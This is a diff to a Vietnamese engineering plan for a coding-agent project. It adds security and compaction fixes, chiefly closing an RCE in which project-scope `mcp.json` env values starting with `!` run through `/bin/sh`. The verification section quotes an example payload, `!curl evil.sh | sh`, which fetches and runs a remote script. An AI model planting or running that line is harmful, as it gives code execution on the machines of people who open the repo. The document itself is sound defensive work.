@@ -49,10 +49,12 @@ Và điều quan trọng nhất, vì nó quyết định phạm vi:
 | vòng 4 | **4 hạng mục, ~1.325 dòng** | `cursor.ts` đã xử dangling call; `model-resolver.ts` đã có `splitThinkingSuffix` |
 | vòng đặc tả M7 | **5 work item** | `look-at` đảo ngược phạm vi; `tool-pair-guard` bị rút |
 | sau merge 18.4.0 | **3 work item** | upstream đã làm xong warm cache (599 dòng + 399 test) |
+| đợt GAP-REGISTER-2 (2026-09-29) | **+4 work item** (0c) | sổ khoảng trống: 1 RCE đang sống + 1 rug-pull + 2 biên compaction. **Một mục là lỗ hổng, không phải cải tiến** — xem Sóng 0c |
 
-**Con số còn lại sau tất cả:** **3 work item** — W0 (pháp lý, điều kiện tiên quyết), SEAM
+**Con số còn lại sau tất cả:** **7 work item** — W0 (pháp lý, điều kiện tiên quyết), SEAM
 (bốn seam API), và SEAMFREE (nhóm builtin chạy được ngay) — cộng LOOKAT ở sóng 2 vì phạm vi
-đã bị đảo ngược. Tổng **~7-8 engineer-day**, không phải con số của "port 40 builtin", và không
+đã bị đảo ngược, **cộng Sóng 0c** (4 mục: `GAP-M7-01` … `GAP-M7-04`, xem mục đó). Tổng
+**~10-11,5 engineer-day**, không phải con số của "port 40 builtin", và không
 phải con số của "3 work item" mà bản thảo đầu đặt ra.
 
 **Ba builtin của senpi bắt nguồn từ chính omp.** `ttsr` và `todotools` được senpi ghi trong
@@ -89,6 +91,10 @@ phải con số của "3 work item" mà bản thảo đầu đặt ra.
   Đây là lần thứ tư trong nghiên cứu này mà phép đo lại **giảm** phạm vi — lần này vì cây code đã
   đi dưới chân kế hoạch trong lúc viết.
 - **Không lấy `mcp`, `compaction`, `webfetch`, `ask-user`, `todotools`** — omp đã mạnh hơn.
+  **Ngoại lệ đã ghi rõ cho `mcp`:** dòng này là một nhận định về **bề mặt tool**, không phải về
+  **đường cấu hình**. Phần tool surface thì không lấy; phần **config-value execution thì lấy vì
+  có lỗ hổng** — `GAP-M7-01` ở Sóng 0c là một RCE đang sống. Tương tự, `GAP-M7-02` và
+  `GAP-M7-04` là **vá hai biên** của compaction, không phải port tầng compaction.
 - **Không lấy `prompt-preset` và `gpt-apply-patch`.** Chúng dò model id trong TypeScript, đúng
   thứ `AGENTS.md` cấm. `packages/catalog` + KDL đã làm việc đó đúng cách.
 
@@ -111,6 +117,7 @@ phải con số của "3 work item" mà bản thảo đầu đặt ra.
 | sóng | work item | chặn gì | công |
 |---|---|---|---|
 | 0 | **W0** pháp lý + ghim nguồn | tất cả | ~1 ngày |
+| 0c | **0c** — RCE + rug-pull + hai biên compaction: `GAP-M7-01` → `GAP-M7-03` → `GAP-M7-02` → `GAP-M7-04` | `GAP-M7-01` còn chặn ở cổng GAP-D9; cả sóng chặn sau W0 | ~3-3,5 ngày |
 | 0 | **SEAM** — bốn seam API | mọi builtin cần event | ~5 ngày (thêm 1-2 nếu cổng P3 trả "hạn chế") |
 | 1 | **SEAMFREE** — nhóm builtin chạy được ngay | không, nhưng nên sau W0 | ~1-2 ngày |
 | 2 | **LOOKAT** — đo lại rồi mới quyết dựng tool hay không | cổng P-L1-2 | ~0,5 ngày nếu chỉ vá |
@@ -352,7 +359,7 @@ phải một.** Đây là lý do nghiên cứu cũ nói "vẫn phải giữ dòn
 
 | path | hành động | thay đổi | đã kiểm chứng? |
 | --- | --- | --- | --- |
-| *(thư mục đích của hạng mục port)/NOTICE` | tạo | **MỘT file cho mỗi hạng mục port**, đặt cạnh code đã port, theo đúng khuôn `crates/pi-shell/NOTICE`. Nội dung bắt buộc có 5 mảnh: tên repo nguồn + URL · **SHA commit đã ghim** · tên file nguồn ở senpi · tên file đích ở omp · điều khoản giữ gì / bỏ gì. | Có. `crates/pi-shell/NOTICE` tồn tại và có **đúng 5 mảnh đó** — SHA ở dòng 8, tên file nguồn và đích cùng một câu, phần "preserves failures… strips header framing" ngay sau. Khuôn này đã qua review, không phải phỏng đoán. **Thư mục đích chưa xác định** — nó do hạng mục port chọn, W0 chỉ chốt khuôn. |
+| `*(thư mục đích của hạng mục port)/NOTICE` | tạo | **MỘT file cho mỗi hạng mục port**, đặt cạnh code đã port, theo đúng khuôn `crates/pi-shell/NOTICE`. Nội dung bắt buộc có 5 mảnh: tên repo nguồn + URL · **SHA commit đã ghim** · tên file nguồn ở senpi · tên file đích ở omp · điều khoản giữ gì / bỏ gì. | Có. `crates/pi-shell/NOTICE` tồn tại và có **đúng 5 mảnh đó** — SHA ở dòng 8, tên file nguồn và đích cùng một câu, phần "preserves failures… strips header framing" ngay sau. Khuôn này đã qua review, không phải phỏng đoán. **Thư mục đích chưa xác định** — nó do hạng mục port chọn, W0 chỉ chốt khuôn. |
 | `THIRD-PARTY-NOTICES.txt` | sửa | Nhân bản `NOTICE` mới vào mục `TRACKED VENDORED CODE AND ASSET NOTICES` (bắt đầu `:18`), theo đúng hình thức mục hiện có: đường kẻ `--`, rồi **đường dẫn file cạnh code**, rồi nội dung. Vị trí chèn: cùng nhóm với `crates/pi-shell/NOTICE` (`:249`). | Có. Mục `:18` tồn tại; mục pi-shell `:249-250` là hình thức mẫu; nội dung của nó **thật sự nằm trong aggregate** (SHA lặp ở `:260`) — `git grep -w` xác nhận. |
 | `scripts/ci-release-publish.test.ts` | sửa | **MỞ RỘNG** describe `published legal payloads` (`:141`) bằng hợp đồng attribution: payload pháp lý mà package MIT thật sự giao cho npm phải chứa dòng copyright của senpi và SHA đã ghim. Đây là file test đã có, đã có factory, **không** tạo file mới. | Có. `scripts/ci-release-publish.test.ts:141-166` tồn tại, `describe("published legal payloads")` ở `:141`, `stageLegalPayloads` được gọi thật ở `:159`. `legalPayloadFiles` đã export (`:97`) và đã có test (`:142-146`). |
 | `packages/coding-agent/test/notices-tracked-files-exist.test.ts` | tạo | Test MỚI: mọi đường dẫn mà mục `TRACKED VENDORED CODE AND ASSET NOTICES` khai báo phải **tồn tại trên đĩa**. Đây là hợp đồng chống aggregate nói về file đã bị đổi tên/xoá. | Có. Thư mục test tồn tại. Danh sách path đọc được ở `THIRD-PARTY-NOTICES.txt:22,59,250,289,320,339,375` — 7 mục, tất cả là file có thật (xem bảng B3-(i)). File test này chưa tồn tại. |
@@ -508,6 +515,361 @@ Một hạng mục port không được báo xanh khi attribution của nó chư
 
 ---
 
+## Sóng 0c — GAP-M7-01 … GAP-M7-04: hai lỗ hổng đang sống + hai biên compaction
+
+**Sóng / phạm vi:** Sóng 0c của M7, đứng **sau Sóng 0a (W0)** và **trước Sóng 0b (SEAM)**. Bốn mục ở đây **không phải** hạng mục lấy tính năng: hai mục là **lỗ hổng** (`GAP-M7-01`, `GAP-M7-03`) và hai mục là **ranh giới đếm / hồi phục** (`GAP-M7-02`, `GAP-M7-04`). W0 là **điều kiện tiên quyết cứng cho cả ba** mục đầu: dòng nào được chép thì phải ghi NOTICE.
+
+> **Nguồn:** `.lavish-wip/GAP-REGISTER-2.md` §M7 — `GAP-M7-01`, `GAP-M7-02`, `GAP-M7-03` (senpi) + `GAP-M7-04` (pi), đo ngày 2026-09-29.
+> Cây đích: `/Users/tranquangdang21/Projects/ultraworkers` (gọi tắt **omp**) · cây nguồn: `/Users/tranquangdang21/Projects/senpi-ref` (gọi tắt **senpi**), ghim theo `ea9216269e9254b821446130b60d1e00759761dc`.
+> Chính sách pháp lý (theo W0): giữ MIT notice · ghi attribution vào `NOTICE` cạnh code + `THIRD-PARTY-NOTICES.txt` · **không** lấy thương hiệu senpi.
+
+> **Một dòng ở "Không làm gì" đã phải sửa — và đã sửa.** Bản gốc của dòng đó ghi **không lấy** mcp: *"Không lấy mcp, compaction, webfetch, ask-user, todotools — omp đã mạnh hơn"* (nay là `MILESTONE_7_EXECUTION_PLAN.md:93`). Cả ba mục đầu dưới đây **mâu thuẫn** dòng đó. Nhưng đó là một nhận định về **bề mặt tool** của MCP, không phải về **đường cấu hình** của MCP — và GAP-M7-01 là một RCE đang sống. Dòng "không lấy" đã được sửa thành "không lấy phần tool surface; phần config-value execution thì lấy vì có lỗ hổng".
+
+**Thứ tự trong sóng** (khác hẳn phần còn lại của M7, đây là thứ tự **ràng buộc pháp lý** chứ không phải ưu tiên): `GAP-M7-01` → `GAP-M7-03` → `GAP-M7-02` → `GAP-M7-04`. `GAP-M7-04` nên **cùng PR hoặc ngay sau** `GAP-M7-02`.
+
+## GAP-M7-01 — Đóng lỗ hổng RCE: `env` của project-scope `mcp.json` không được chạm `/bin/sh`
+
+**Sóng / phạm vi:** Sóng 0c, hạng mục `G1`. **Ưu tiên cao nhất trong sóng 0c** — khác ba mục kia, đây là **lỗ hổng đang sống**, không phải điều chỉnh.
+**Effort:** M–L (1–1,5 ngày)
+**Phụ thuộc:** W0 (pháp lý) là điều kiện tiên quyết. Ngoài ra **GAP-D9 phải có câu trả lời bằng văn bản trong ADR của M2 WI-0 trước khi có dòng code nào** — vì phương án (b) của GAP-D9 kéo theo một việc chưa ai giao.
+**Nguồn:** `senpi.65`
+
+**Đây là khoảng trống nặng nhất tìm được trong đợt này.**
+
+## Xác minh
+
+Đã kiểm, từng mắt xích:
+
+- `packages/coding-agent/src/config/resolve-config-value.ts:22-24` — `isCommandConfigValue` trả `true` cho **bất kỳ** giá trị bắt đầu bằng `!`.
+- `:104-108` — `resolveConfigValue` điều phối giá trị đó tới `executeCommand`.
+- `:132` — chạy nó qua `ptree.exec(["/bin/sh", "-c", command], …)` **trong thư mục project**.
+- `packages/coding-agent/src/mcp/manager.ts:1892-1906` — gọi `resolveConfigValue` trên **mọi** env entry của **mọi** stdio MCP server không có `envPolicy: "literal"`.
+- `packages/coding-agent/src/mcp/config.ts:104` — `const enableProjectConfig = options?.enableProjectConfig ?? true` — **mặc định là TRUE**, và call site duy nhất ghi đè là `packages/coding-agent/src/cli/read-cli.ts:90` đọc một user setting.
+
+**Hệ quả:** clone một repo thù địch chứa `.omp/mcp.json` với `"env": {"X": "!curl evil.sh | sh"}`, rồi chạy omp trong đó → lệnh đó chạy.
+
+**Một nửa không phải lỗ hổng — và phải nói rõ.** Nửa `$(` của senpi **không** là gap thật của omp: `resolve-config-value.ts:106` dùng `$envExact`, một tra cứu tên chính xác, không phải khai triển template, nên `$(...)` đi qua **inert**. Chỉ nửa `!` là toàn bộ phát hiện. Ghi sai chỗ này sẽ dẫn tới một PR sửa một thứ vốn đã an toàn và bỏ sót thứ thật sự nguy hiểm.
+
+## File cần chạm tới
+
+| path | hành động | thay đổi | đã kiểm chứng? |
+| --- | --- | --- | --- |
+| `packages/coding-agent/src/config/resolve-config-value.ts` | sửa | Điểm vào của RCE. `:22-24` (`isCommandConfigValue`), `:104-108` (`resolveConfigValue` điều phối tới `executeCommand`), `:132` (`ptree.exec(["/bin/sh", "-c", command], …)` trong thư mục project). Sửa bằng cách cho độ phân giải exec **phụ thuộc mức tin cậy của config**, không bằng cách ném toàn cục. | Có (đọc cả ba dải) |
+| `packages/coding-agent/src/mcp/manager.ts` | sửa | `:1892-1906` — chỗ duy nhất áp `resolveConfigValue` lên env của stdio server. Đây là **carrier đúng**: `envPolicy: "literal"` đã có sẵn ở chính dòng `:1892`, việc sửa là làm project-scope server **mặc định** là nó. | Có |
+| `packages/coding-agent/src/mcp/config.ts` | sửa | `:104` — `options?.enableProjectConfig ?? true`, mặc định TRUE. Đây là chốt chặn đầu tiên, không phải chốt chặn duy nhất. | Có |
+| `packages/coding-agent/src/cli/read-cli.ts` | đọc | `:90` — call site **duy nhất** ghi đè `enableProjectConfig`. Sửa ở đây là hợp lệ (đọc user setting), nhưng phải biết nó **không phải** chốt chặn duy nhất. | Có |
+| `packages/coding-agent/src/config/model-registry.ts` | **KHÔNG đụng** | `:436` `authStorage.keys.setResolver(resolveConfigValue)` — đây là lý do `!command` là **tính năng mang tải trọng thật**, và là lý do effort là M–L chứ không phải S. | Có |
+| `packages/ai/src/auth/types.ts` | **KHÔNG đụng** | `:337` — nơi `!command` được tài liệu hoá. Đổi hành ở đây là phá tài liệu của một tính năng đang chạy. | Có |
+| `packages/coding-agent/test/*` (file mới) | tạo | Test contract: **giữ xanh** cho user-scope `!command`, **đỏ** cho project-scope. Tên file do người thực hiện chọn theo khuôn `packages/coding-agent/test/`. | Có (chưa tồn tại) |
+
+## Các bước
+
+1. **CỔNG — chốt GAP-D9 bằng văn bản TRƯỚC khi viết dòng code nào.** Trust của project-scope `mcp.json` do ai quyết? senpi trả lời bằng prompt (`senpi.93`); mục này trả lời bằng **mặc định theo scope**. Phương án khuyến nghị là **(b)** — mặc định theo scope **và** một prompt của M2 WI-0 cho phép nâng lên — nhưng (b) **kéo theo một việc chưa ai giao**: M2 WI-0 hiện viết ADR về trust của *extension*, chưa nói gì về **MCP project-scope config**. Câu hỏi đó phải có câu trả lời trong ADR trước khi mục này code. Ghi câu trả lời nguyên văn vào kế hoạch đã track — **không** ghi vào `.lavish-wip/`. *(anchor: bảng quyết định của sổ, `GAP-D9`)*
+
+2. **Lấy RULE của senpi, KHÔNG lấy CÔNG CỤ.** Không port blanket throw của senpi: `!command` của omp đứng sau `authStorage.keys.setResolver(resolveConfigValue)` tại `config/model-registry.ts:436` và được tài liệu hoá ở `packages/ai/src/auth/types.ts:337`. Port thẳng sẽ phá một tính năng đang chạy. *(anchor: `packages/coding-agent/src/config/model-registry.ts:436`, `packages/ai/src/auth/types.ts:337`)*
+
+3. **Sửa theo hướng "mặc định theo scope".** `!command` chỉ resolve cho **user-scope** `mcp.json`, và bị từ chối (hoặc hạ xuống literal) cho **project-scope** trừ khi project trust được cấp. Dùng `envPolicy: "literal"` làm carrier. *(anchor: `packages/coding-agent/src/mcp/manager.ts:1892`)*
+
+4. **Giữ nguyên 100% hành vi của đường user-scope** — kể cả `authStorage` key resolver. Đây là lý do effort là M–L chứ không phải S: blast radius là đường đó. *(anchor: `packages/coding-agent/src/config/model-registry.ts:436`)*
+
+5. **Liên hệ `senpi.93`.** senpi.93 (project trust gate) trả lời bằng **prompt**, mục này trả lời bằng **mặc định theo scope**. Làm cả hai thì mục này đến trước và biến 93 thành một cải thiện UX, không phải một điều kiện bảo mật. *(anchor: sổ §M7, "Liên hệ senpi.93")*
+
+6. **Pháp lý.** Chép được, nhưng **KHÔNG nên chép nguyên văn** — đây là mục ta lấy RULE chứ không lấy CODE. Hai-token check của senpi là MIT nên chép thì hợp pháp; chỉ là sai hình dạng cho omp. Nghĩa vụ: giữ MIT notice + `NOTICE.md` attribution + **không** lấy trademark senpi. W0 chi phối. *(anchor: Sóng 0a — W0)*
+
+7. **`bun check` (KHÔNG dùng `tsc`/`npx tsc`)** và chạy test của mục này. Không `mock.module()`. Nếu cần spy thì `vi.spyOn` trên namespace đã import + `vi.restoreAllMocks()` trong `afterEach`. *(anchor: `AGENTS.md` "Testing Guidance")*
+
+## Hợp đồng test
+
+**Cái được bảo toàn:** **Đường user-scope phải giữ nguyên 100% hành vi** — kể cả `authStorage` key resolver. Test phải **giữ xanh** cho user-scope `!command` và **đỏ** cho project-scope. Một bộ test chỉ chứng minh phía "đỏ" sẽ xanh với một bản ném toàn cục — tức phá đúng tính năng mà bước 4 nói phải bảo toàn.
+
+| # | Hợp đồng | Loại | Vì sao là hợp đồng quan sát được |
+| --- | --- | --- | --- |
+| G1-T1 | Env entry `!…` của một server ở **user-scope** vẫn được phân giải và chạy, kể cả qua `authStorage.keys.setResolver`. | dương | Đây là phần blast radius lớn nhất. Xanh ở đây là bằng chứng bản vá không phá tính năng. |
+| G1-T2 | Env entry `!…` của một server ở **project-scope** **không** chạy — giá trị bị từ chối hoặc hạ xuống literal. | phủ định | Đây là hợp đồng bảo mật của mục. Nếu chỉ khẳng định G1-T1, test xanh trên cả bản vá hỏng. |
+| G1-T3 | Server khai `envPolicy: "literal"` sẵn **giữ nguyên** hành vi sau thay đổi. | dương | `manager.ts:1892` đã là carrier có thật; test bảo vệ việc dùng nó thay vì phát minh cơ chế thứ hai. |
+| G1-T4 | `$(` đi qua **inert** trước và sau thay đổi. | phủ định | `resolve-config-value.ts:106` dùng `$envExact`, không phải khai triển template. Sổ nói rõ nửa này **không phải** gap thật — test khẳng định điều đó để không ai "sửa" nhầm vào nó. |
+
+Ràng buộc: **không source-grep** (AGENTS.md cấm), **không `mock.module()`**, **không `tsc`** — dùng `bun check`. Test phải full-suite safe: `vi.spyOn` + `vi.restoreAllMocks()` trong `afterEach`, không sửa `process.env`/`Bun.env` ở cấp file.
+
+## Cổng hoàn thành
+
+Mỗi cổng phải **phân biệt được "đã làm" với "không chạy được"**. Cổng trả về thành công khi **không nhìn thấy gì** là cổng không có tác dụng.
+
+| Cổng | Điều kiện | Phân biệt được "đã làm" với "không chạy được" |
+| --- | --- | --- |
+| **G1** | GAP-D9 trả lời **bằng văn bản**, tên người quyết, ghi trong kế hoạch đã track | Trả lời bằng văn bản, tên người quyết. Đây là cổng quyết định **cấu trúc**, không phải chi tiết. |
+| **G1-G1** | Test project-scope `!…` **đỏ** trước bản vá, **xanh** sau bản vá | Chạy test trên cây trước khi vá là bằng chứng cổng có tác dụng; một cổng xanh ngay từ đầu là cổng chết. |
+| **G1-G2** | Test user-scope `!…` **xanh trước và sau** bản vá | Đây là hợp đồng bảo toàn. Không có nó, bản vá "an toàn" bằng cách phá tính năng vẫn xanh. |
+| **G1-G3** | Cổng W0 **xanh** trước khi mục này báo xong | W0 là điều kiện tiên quyết cứng; cổng của mục này không được báo xanh khi attribution của nó chưa có trong payload. |
+| **G1-G4** | `bun check` sạch, test xanh, **không `mock.module()`** | `tsc` bị cấm. |
+
+## Rủi ro
+
+| # | rủi ro | xác suất | hậu quả | chặn bởi |
+|---|---|---|---|---|
+| **G1-R1** | **Ném toàn cục** thay vì mặc định theo scope | Cao nếu chép nguyên senpi | Phá `!command` của user-scope — mất `authStorage` key resolver. Đây là cách port sai dễ nhất vì blanket throw nghe có vẻ "chặn an toàn" | G1-G2 + bước 2 + bước 4 |
+| **G1-R2** | **Sửa nhầm nửa `$(`** | Trung bình | PR sửa một thứ vốn đã an toàn (`$envExact` là tra cứu tên chính xác) và **bỏ sót** thứ thật sự nguy hiểm. Sổ nêu đây là cái bẫy cụ thể của mục này | G1-T4 |
+| **G1-R3** | Sửa `mcp/config.ts:104` tưởng là đủ | Cao | `enableProjectConfig` mặc định TRUE chỉ là **một** chốt chặn; `manager.ts:1892-1906` vẫn phân giải env của project-scope server nếu nó bật | G1-T2 |
+| **G1-R4** | Chốt GAP-D9 theo phương án (b) mà ADR của M2 WI-0 chưa nói về MCP project-scope config | Trung bình | Hai tài liệu quyết định khác nhau về cùng một trust model ⇒ phải viết lại ADR lần hai | G1 + GAP-D9 |
+| **G1-R5** | Copy dòng senpi mà không ghi NOTICE | Thấp nếu W0 chạy | Nghĩa vụ pháp lý thứ hai bị vỡ; cổng W0 đỏ | G1-G3 |
+
+## Cổng còn mở — cần người quyết
+
+| # | câu hỏi | chặn cái gì | vì sao không tự quyết |
+|---|---|---|---|
+| **GAP-D9** | **Trust của project-scope `mcp.json` do ai quyết?** senpi trả lời bằng prompt (`senpi.93`); mục này trả lời bằng mặc định theo scope. | Toàn bộ `GAP-M7-01` | Quyết định chính sách bảo mật, không phải quyết định kỹ thuật. **Phương án (a)** chỉ mặc định theo scope, không có prompt (rủi ro thấp, người dùng mất tính năng cho project); **phương án (b)** mặc định theo scope **và** một prompt của M2 WI-0 cho phép nâng lên. **Khuyến nghị (b)** — nhưng (b) kéo theo một việc chưa ai giao, nên phải trả lời trong ADR của M2 WI-0 trước. |
+
+## Đối chiếu so với kế hoạch này
+
+- Mục này **mâu thuẫn trực tiếp** với dòng *"Không lấy `mcp`, `compaction`, `webfetch`, `ask-user`, `todotools`"* ở mục **Không làm gì**. Dòng đó đã được sửa tại chỗ: không lấy **phần tool surface** của MCP, còn **đường cấu hình** thì lấy — vì có lỗ hổng.
+- M7 trước đây **không có work item nào** cho đường cấu hình MCP. Không mục nào trong bốn mục cũ của M7 (W0, SEAM, SEAMFREE, LOOKAT) chạm `resolveConfigValue` hay `envPolicy`.
+
+---
+
+## GAP-M7-02 — Drop failed assistant turn ngay tại biên compaction, không chỉ ở biên session-restore
+
+**Sóng / phạm vi:** Sóng 0c, hạng mục `G2`. Không phải lỗ hổng — là **sự lệch kế toán** giữa tập entry dùng để cắt và tập entry mang đi trong request kế tiếp.
+**Effort:** S — khoảng 0,5 ngày. Lý do đã được viết sẵn trong doc comment của senpi, không cần làm thiết kế.
+**Phụ thuộc:** W0 (pháp lý). **Không cái gì khác** — không chạm bốn seam API, không cần `agent_settled` hay `sessionSettings`.
+**Nguồn:** `senpi.3`
+
+## Xác minh
+
+**Cái omp thiếu — đã kiểm, và đây là bằng chứng mạnh.** omp drop turn lỗi/abort ở **đúng một chỗ**: `buildSessionContext()` trong `packages/coding-agent/src/session/session-context.ts` (vòng `if (!options?.transcript)` từ `:703`). `grep -n 'stopReason === "error"' -- packages/coding-agent/src/session/*.ts` cho thấy các hit còn lại đều là predicate **theo tính năng** (`isTitleContextReply` `messages.ts:157`, `assistantTurnProducedOutput` `:538`, `isTranscriptUsageAnchor` `transcript-tokens.ts:46`, các guard plan-mode/exit-diagnostics) — **không cái nào xoá message**.
+
+Hai consumer dựng LLM request **không** đi qua `buildSessionContext`:
+
+- **compaction** — `packages/agent/src/compaction/compaction.ts:1416-1426` gọi `findCutPoint(compactionEntries, tokenizer, 0, len, keepRecentTokens)` trên danh sách entry thô; một assistant turn đã fail là một cut point hợp lệ, nên text dở của nó **được tính vào** `keepRecentTokens` và có thể bị giữ lại.
+- **default turn converter** — `packages/agent/src/agent.ts:72-77` lọc theo `role` và **không bao giờ** nhìn `stopReason`; `packages/coding-agent/src/session/messages.ts:1137` `convertToLlm` cũng vậy (đã kiểm: không có `stopReason` trong thân hàm).
+
+Nên tuyên bố của senpi **đúng**: trigger compaction đếm quá các turn fail, và tập đó không còn khớp với tập mà request kế tiếp mang đi.
+
+## File cần chạm tới
+
+| path | hành động | thay đổi | đã kiểm chứng? |
+| --- | --- | --- | --- |
+| `packages/agent/src/compaction/drop-failed-assistant-turns.ts` | **tạo** | Leaf helper `dropFailedAssistantTurns<T extends { role: string }>(messages: readonly T[]): T[]`. Đặt đúng chỗ senpi đặt nó (`packages/ai/src/utils/drop-failed-assistant-turns.ts`), vào `packages/agent/src/compaction/`. Kiểu tham số `{ role: string }` + narrowing runtime là **có chủ đích**, để truyền được cả `Message[]` lẫn `AgentMessage[]` — giữ nguyên hình dạng đó. | Có (chưa tồn tại — `find packages -name "*drop*failed*"` rỗng) |
+| `packages/agent/src/compaction/compaction.ts` | sửa | `:1416-1426` — gọi helper từ **entry scan của `findCutPoint`**. **Chỉ phần đếm trước** thay đổi; thuật toán cắt pair-safe giữ nguyên. | Có |
+| `packages/agent/src/compaction/compaction.ts` | sửa | **Trigger compaction** — gọi cùng helper đó, theo `senpi.3`. | Có |
+| `packages/coding-agent/src/session/session-context.ts` | **KHÔNG đụng** | `buildSessionContext()` phải giữ nguyên hành vi drop hiện tại — nếu không thì session-restore sẽ giữ lại những turn đáng lẽ phải mất. | Có |
+| `packages/coding-agent/src/session/messages.ts` | **KHÔNG đụng** | `convertToLlm` ở `:1137` đã được phủ; **không** port phần `harness/messages.ts` tail của senpi. | Có |
+| `packages/ai/src/utils/drop-failed-assistant-turns.ts` (senpi) | đọc | Nguồn port. Hàm ~40 dòng. | Có |
+| `packages/agent/test/*` (file mới) | tạo | Test contract cho cả hai biên. | Có (chưa tồn tại) |
+
+## Các bước
+
+1. **Thêm leaf helper** `dropFailedAssistantTurns<T extends { role: string }>(messages: readonly T[]): T[]` vào `packages/agent/src/compaction/`, đặt đúng chỗ senpi đặt. Giữ nguyên hình dạng kiểu tham số — đó là thứ cho phép truyền được cả hai loại message. *(anchor: senpi `packages/ai/src/utils/drop-failed-assistant-turns.ts`)*
+
+2. **Gọi nó từ entry scan của `findCutPoint`.** Chỉ phần **đếm trước** thay đổi — thuật toán cắt pair-safe giữ nguyên, nếu không mục này sửa một thứ đang đúng. *(anchor: `packages/agent/src/compaction/compaction.ts:1416-1426`)*
+
+3. **Gọi nó từ trigger compaction** — consumer thứ hai, cùng một helper. *(anchor: `packages/agent/src/compaction/compaction.ts`)*
+
+4. **KHÔNG** port phần `harness/messages.ts` `convertToLlm` tail của senpi — đường đó đã được phủ ở `packages/coding-agent/src/session/messages.ts:1137`. *(anchor: `packages/coding-agent/src/session/messages.ts:1137`)*
+
+5. **`buildSessionContext()` giữ nguyên hành vi drop hiện tại.** Không có bước "dọn cho gọn" ở đây. *(anchor: `packages/coding-agent/src/session/session-context.ts:703`)*
+
+6. **Pháp lý.** Chép được, chép rồi phải giữ MIT notice. `~/Projects/senpi-ref/LICENSE` là MIT thuần (22 dòng; dòng 1 "MIT License"; dòng 3 "Copyright (c) 2025 Mario Zechner (upstream pi-mono)"; dòng 4 "Copyright (c) 2026 Yeongyu Kim and senpi contributors"). senpi **không** có điều khoản AGPL/MuPDF và **không** có copyleft ở đâu trong cây; nghĩa vụ bên thứ ba duy nhất có sức ép hành vi là LinkeDOM (ISC) ghi trong `NOTICE.md` của họ, mà mục này không đụng tới. Nghĩa vụ cho một hàm ~40 dòng: giữ notice + copyright, ghi attribution vào `NOTICE.md` của omp **ghim theo SHA `ea9216269e9254b821446130b60d1e00759761dc`**, không lấy trademark senpi. M7 W0 đã đặc tả đúng như vậy. *(anchor: Sóng 0a — W0, cổng bước 1)*
+
+7. **`bun check` (KHÔNG dùng `tsc`/`npx tsc`)** và chạy test của mục này. Không `mock.module()`. *(anchor: `AGENTS.md` "Testing Guidance")*
+
+## Hợp đồng test
+
+**Cái được bảo toàn:** `buildSessionContext()` phải giữ nguyên hành vi drop hiện tại — nếu không thì session-restore sẽ giữ lại những turn đáng lẽ phải mất. Và `findCutPoint` phải giữ nguyên thuật toán cắt pair-safe; chỉ phần **đếm trước** thay đổi.
+
+| # | Hợp đồng | Loại | Vì sao là hợp đồng quan sát được |
+| --- | --- | --- | --- |
+| G2-T1 | Assistant turn có `stopReason` lỗi **không** được tính vào tập mà `findCutPoint` quét để đếm `keepRecentTokens`. | dương | Đây là hợp đồng của mục: text dở của một turn fail không nên chiếm ngân sách giữ lại. |
+| G2-T2 | Cùng tập đó, `findCutPoint` vẫn trả **cut point pair-safe** — một tool_use không có tool_result đi kèm không bị cắt đôi. | phủ định | Đây là phần bảo toàn mà một bản vá "chỉ lọc cho khỏi" sẽ phá. |
+| G2-T3 | Turn hợp lệ (không lỗi) **không** bị drop. | phủ định | Chứng minh bộ lọc có ranh giới; một bản lọc quá tay vẫn xanh nếu chỉ có G2-T1. |
+| G2-T4 | `buildSessionContext()` vẫn drop turn lỗi ở biên session-restore như trước bản vá. | dương | Hợp đồng bảo toàn. Thiếu nó thì bản vá có thể âm thầm đổi hành restore. |
+
+Ràng buộc: **không source-grep** (AGENTS.md cấm), **không `mock.module()`**, **không `tsc`** — dùng `bun check`. Test phải full-suite safe: `vi.spyOn` + `vi.restoreAllMocks()` trong `afterEach`.
+
+## Cổng hoàn thành
+
+| Cổng | Điều kiện | Phân biệt được "đã làm" với "không chạy được" |
+| --- | --- | --- |
+| **G2** | Cổng W0 **xanh** trước khi mục này báo xong | W0 là điều kiện tiên quyết; attribution phải có trong payload. |
+| **G2-G1** | `findCutPoint` vẫn cắt pair-safe sau bản vá | Đây là cổng bảo toàn thuật toán; không có nó thì một lọc sai sẽ tạo dangling tool_use. |
+| **G2-G2** | `buildSessionContext()` không đổi hành vi | Chạy test restore trước và sau bản vá; sai lệch là đỏ. |
+| **G2-G3** | `bun check` sạch, test xanh, **không `mock.module()`** | `tsc` bị cấm. |
+
+## Rủi ro
+
+| # | rủi ro | xác suất | hậu quả | chặn bởi |
+|---|---|---|---|---|
+| **G2-R1** | Lọc quá tay — drop nhầm turn hợp lệ | Trung bình | Mất nội dung hợp lệ khỏi context mà không ai thấy | G2-T3 |
+| **G2-R2** | Sửa luôn thuật toán cắt pair-safe cho "gọn" | Trung bình | Dangling tool_use ⇒ lỗi wire 500, tức là tạo ra đúng loại bug mà `tool-pair-guard` ở Phụ lục đã bị rút vì đã có sẵn | G2-T2 + bước 2 |
+| **G2-R3** | "Dọn cho gọn" `buildSessionContext()` | Trung bình | Session-restore giữ lại turn đáng lẽ phải mất | G2-G2 + bước 5 |
+| **G2-R4** | Chép cả tail `convertToLlm` của senpi dù đường đó đã được phủ | Thấp | Diff rộng hơn cần thiết, và hai nơi drop trùng nhau | Bước 4 |
+| **G2-R5** | Gộp với `GAP-M7-04` vào một PR | Trung bình | Một PR sửa nhiều file với **hai cổng đỏ không liên quan** | Xem mục *Gộp hay không* ở `GAP-M7-04` |
+
+## Đối chiếu so với kế hoạch này
+
+- **Đã phủ chưa: một phần, về tinh thần chứ không phải ở cổng work item.** M7 **không có** work item cho việc này; gần nhất là `tool-pair-guard` đã rút (`appendix, :1831-1855`) — cái đó phủ **ORPHAN tool_use/tool_result pairing**, một kiểu hỏng khác. Không work item nào trong bốn mục cũ của M7 (W0, SEAM, SEAMFREE, LOOKAT) nhắc compaction accounting.
+- Dòng *"Không lấy … `compaction` …"* ở mục **Không làm gì** là một nhận định về **tầng compaction như một hạng mục port tính năng**; mục này là **vá hai biên**, không port tầng đó. Cùng bất điểm với `mcp` ở `GAP-M7-01`.
+
+---
+
+## GAP-M7-03 — Rug-pull defense: tool mới từ `notifications/tools/list_changed` không được tự kích hoạt
+
+**Sóng / phạm vi:** Sóng 0c, hạng mục `G3`. **Xếp sau `GAP-M7-01`** trong sóng 0c. Đây là lỗ hổng thứ hai của sóng.
+**Effort:** M — khoảng 1 ngày
+**Phụ thuộc:** W0 (pháp lý). Không phụ thuộc bốn seam API, không cần `agent_settled` hay `sessionSettings`.
